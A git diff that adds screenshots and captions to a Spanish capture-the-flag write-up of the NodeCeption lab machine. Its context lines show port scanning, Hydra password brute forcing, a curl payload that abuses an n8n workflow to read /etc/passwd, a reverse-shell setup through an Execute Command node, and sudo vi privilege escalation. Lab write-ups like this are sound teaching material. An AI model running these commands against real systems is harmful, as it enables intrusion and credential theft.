@@ -37,6 +37,9 @@ Antes de iniciar el análisis del objetivo, se validó la configuración de red 
 ```bash
 ip a
 ```
+<img src="../assets/img/nodeception/01_confirmacion_ip_propia.png" alt="Figura 1. Confirmación IP máquina atacante" width="850">
+
+<p><strong>Figura 1.</strong> Confirmación de la dirección IP de la máquina atacante Kali Linux mediante el comando <code>ip a</code>.</p>
 
 Salida relevante:
 
@@ -53,6 +56,9 @@ sudo netdiscover
 sudo nmap -sn 192.168.1.0/24
 sudo arp-scan -l
 ```
+<img src="../assets/img/nodeception/02_confirmacion_ip_objetivo.png" alt="Figura 2. Confirmación IP máquina objetivo" width="850">
+
+<p><strong>Figura 2.</strong> Confirmación de la dirección IP asignada a la máquina objetivo NodeCeption.</p>
 
 Salida relevante:
 
@@ -71,6 +77,9 @@ Se ejecutó un escaneo completo de puertos TCP para identificar servicios expues
 ```bash
 nmap -p- 192.168.1.27
 ```
+<img src="../assets/img/nodeception/03_escaneo_inicial.png" alt="Figura 3. Escaneo inicial de puertos" width="850">
+
+<p><strong>Figura 3.</strong> Escaneo inicial de puertos TCP sobre NodeCeption mediante Nmap.</p>
 
 Puertos identificados:
 
@@ -85,6 +94,9 @@ Posteriormente, se realizó detección de versiones y ejecución de scripts bás
 ```bash
 sudo nmap -sV -sC -A -O -p 22,5678,8765 192.168.1.27
 ```
+<img src="../assets/img/nodeception/04_escaneo_versiones.png" alt="Figura 4. Escaneo de versiones" width="850">
+
+<p><strong>Figura 4.</strong> Detección de servicios y versiones en los puertos identificados como abiertos.</p>
 
 Salida relevante:
 
@@ -123,6 +135,9 @@ window.REST_ENDPOINT = 'rest';
 <script type="module" crossorigin src="/assets/index-B3p3789J.js"></script>
 <link rel="stylesheet" crossorigin href="/assets/index-COleXxZf.css">
 ```
+<img src="../assets/img/nodeception/05_enum_http.png" alt="Figura 5. Enumeración HTTP" width="850">
+
+<p><strong>Figura 5.</strong> Enumeración inicial del servicio HTTP expuesto en el puerto 5678 mediante <code>curl</code>.</p>
 
 El contenido HTML permitió identificar que el servicio corresponde a **n8n.io - Workflow Automation**. También se observó que la aplicación utiliza el endpoint REST bajo la ruta `/rest`.
 
@@ -143,6 +158,9 @@ Salida relevante:
 /rest/login    -> HTTP/1.1 401 Unauthorized
 /rest/sentry.js -> HTTP/1.1 200 OK
 ```
+<img src="../assets/img/nodeception/06_panel_n8n.png" alt="Figura 6. Panel n8n" width="850">
+
+<p><strong>Figura 6.</strong> Visualización del panel web de n8n expuesto en el puerto 5678.</p>
 
 Datos técnicos obtenidos desde `/rest/settings` y `/rest/sentry.js`:
 
@@ -182,6 +200,9 @@ wfuzz -u http://192.168.1.27:8765/FUZZ \
   -w /usr/share/dirb/wordlists/common.txt \
   --hc 404 -c
 ```
+<img src="../assets/img/nodeception/07_fuzzing.png" alt="Figura 7. Fuzzing web" width="850">
+
+<p><strong>Figura 7.</strong> Enumeración de rutas y archivos mediante técnicas de fuzzing web.</p>
 
 Recursos identificados:
 
@@ -207,6 +228,9 @@ Espero que hayas cambiado la contraseña como se te indicó.
 Recuerda: mínimo 8 caracteres, al menos 1 número y 1 mayúscula.
 -->
 ```
+<img src="../assets/img/nodeception/09_codigo_fuente_8765.png" alt="Figura 9. Código fuente puerto 8765" width="850">
+
+<p><strong>Figura 9.</strong> Inspección del código fuente de la página web del puerto 8765, identificando información útil para la autenticación.</p>
 
 El comentario expone un posible usuario válido y una política de contraseña, lo que reduce el espacio de búsqueda para pruebas controladas de autenticación.
 
@@ -238,12 +262,18 @@ hydra -l usuario@maildelctf.com \
   http-post-form "/login.php:email=^USER^&password=^PASS^:F=Credenciales incorrectas." \
   -s 8765 -V
 ```
+<img src="../assets/img/nodeception/10_hidra.png" alt="Figura 10. Ataque con Hydra" width="850">
+
+<p><strong>Figura 10.</strong> Prueba controlada de credenciales mediante Hydra contra el formulario de autenticación.</p>
 
 Resultado relevante:
 
 ```text
 [8765][http-post-form] host: 192.168.1.27 login: usuario@maildelctf.com password: [REDACTED]
 ```
+<img src="../assets/img/nodeception/11_login_8765.png" alt="Figura 11. Login puerto 8765" width="850">
+
+<p><strong>Figura 11.</strong> Validación de credenciales correctas en el formulario <code>login.php</code> del puerto 8765.</p>
 
 Las credenciales obtenidas permitieron iniciar sesión en `/login.php`. El panel indicó que las mismas credenciales podían reutilizarse en n8n, lo que evidencia una debilidad por reutilización de credenciales.
 
@@ -253,10 +283,18 @@ Las credenciales obtenidas permitieron iniciar sesión en `/login.php`. El panel
 
 Con las credenciales válidas obtenidas desde el panel del puerto `8765`, se accedió al servicio n8n en el puerto `5678`.
 
+<img src="../assets/img/nodeception/12_n8n_workflow.png" alt="Figura 12. Workflow n8n" width="850">
+
+<p><strong>Figura 12.</strong> Identificación de un workflow activo dentro del panel n8n.</p>
+
 Dentro de n8n se observó un workflow activo llamado **My workflow**, compuesto por:
 
 - Nodo **Webhook**.
 - Nodo **Leer Archivo**.
+
+<img src="../assets/img/nodeception/13_n8n_workflow_2.png" alt="Figura 13. Workflow n8n detalle" width="850">
+
+<p><strong>Figura 13.</strong> Revisión del workflow compuesto por un nodo Webhook y un nodo de lectura de archivos.</p>
 
 El nodo de lectura utilizaba una ruta dinámica basada en la entrada recibida por el webhook:
 
@@ -273,12 +311,23 @@ curl -s -X POST http://192.168.1.27:5678/webhook-test/lfi-test \
   -H "Content-Type: application/json" \
   -d '{"file":"/etc/passwd"}'
 ```
+<img src="../assets/img/nodeception/14_curl_workflow.png" alt="Figura 14. Activación del workflow con curl" width="850">
+
+<p><strong>Figura 14.</strong> Activación del workflow mediante una solicitud HTTP enviada con <code>curl</code>.</p>
 
 El workflow leyó correctamente el archivo local, confirmando una vulnerabilidad de lectura arbitraria de archivos mediante automatización mal configurada.
+
+<img src="../assets/img/nodeception/15_passwd.png" alt="Figura 15. Lectura de passwd" width="850">
+
+<p><strong>Figura 15.</strong> Lectura del archivo <code>/etc/passwd</code> mediante abuso del nodo de lectura de archivos.</p>
 
 ## 8. Obtención de acceso inicial
 
 Para obtener una shell remota, se agregó un nodo **Execute Command** dentro del workflow de n8n y se configuró una reverse shell hacia Kali.
+
+<img src="../assets/img/nodeception/16_execute_command.png" alt="Figura 16. Nodo Execute Command" width="850">
+
+<p><strong>Figura 16.</strong> Incorporación del nodo <code>Execute Command</code> para ejecutar comandos desde n8n.</p>
 
 Comando configurado en n8n:
 
@@ -299,8 +348,15 @@ Conexión recibida desde 192.168.1.27
 whoami
 thl
 ```
+<img src="../assets/img/nodeception/18_basch.png" alt="Figura 17. Configuración reverse shell" width="850">
+
+<p><strong>Figura 17.</strong> Configuración del comando Bash utilizado para generar una reverse shell hacia la máquina atacante.</p>
 
 La sesión inicial se obtuvo como el usuario `thl`.
+
+<img src="../assets/img/nodeception/19_shell_reverse.png" alt="Figura 18. Shell reversa obtenida" width="850">
+
+<p><strong>Figura 18.</strong> Recepción de la reverse shell en Kali Linux mediante Netcat.</p>
 
 Se buscó la bandera de usuario:
 
@@ -316,6 +372,10 @@ Resultado:
 [FLAG USER REDACTED]
 ```
 
+<img src="../assets/img/nodeception/20_bandera_user.png" alt="Figura 19. Bandera user.txt" width="850">
+
+<p><strong>Figura 19.</strong> Obtención de la bandera <code>user.txt</code> desde el usuario comprometido.</p>
+
 ## 9. Escalada de privilegios
 
 Durante la enumeración local, se revisaron privilegios sudo.
@@ -324,11 +384,23 @@ Durante la enumeración local, se revisaron privilegios sudo.
 sudo -l
 ```
 
+<img src="../assets/img/nodeception/22_binario_2.png" alt="Figura 21. Análisis de binario privilegiado" width="850">
+
+<p><strong>Figura 21.</strong> Análisis del binario identificado como posible vector de escalada de privilegios.</p>
+
 Se identificó que el usuario `thl` podía ejecutar el binario `vi` con privilegios elevados. Debido a que la reverse shell no tenía una TTY adecuada para ingresar contraseña de sudo, se validó acceso SSH con el usuario local.
+
+<img src="../assets/img/nodeception/23_binario_fallido.png" alt="Figura 22. Intento fallido de escalada" width="850">
+
+<p><strong>Figura 22.</strong> Intento inicial de abuso del binario privilegiado desde una shell sin TTY interactiva.</p>
 
 ```bash
 hydra -l thl -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.27 -t 4 -V
 ```
+
+<img src="../assets/img/nodeception/24_hidra_ssh.png" alt="Figura 23. Credenciales SSH con Hydra" width="850">
+
+<p><strong>Figura 23.</strong> Identificación de credenciales válidas para SSH mediante una prueba controlada con Hydra.</p>
 
 Resultado:
 
@@ -341,6 +413,10 @@ Luego se inició sesión por SSH:
 ```bash
 ssh thl@192.168.1.27
 ```
+
+<img src="../assets/img/nodeception/25_ingreso_ssh_root.png" alt="Figura 24. Escalada y root.txt" width="850">
+
+<p><strong>Figura 24.</strong> Ingreso por SSH, escalada de privilegios y obtención de la bandera <code>root.txt</code>.</p>
 
 Con una TTY interactiva, se explotó el permiso sudo sobre `vi` usando una técnica documentada en GTFOBins.
 
@@ -359,6 +435,10 @@ Resultado:
 ```text
 root
 ```
+
+<img src="../assets/img/nodeception/25_ingreso_ssh_root.png" alt="Figura 24. Escalada y root.txt" width="850">
+
+<p><strong>Figura 24.</strong> Ingreso por SSH, escalada de privilegios y obtención de la bandera <code>root.txt</code>.</p>
 
 Se localizó y leyó la bandera de root:
 
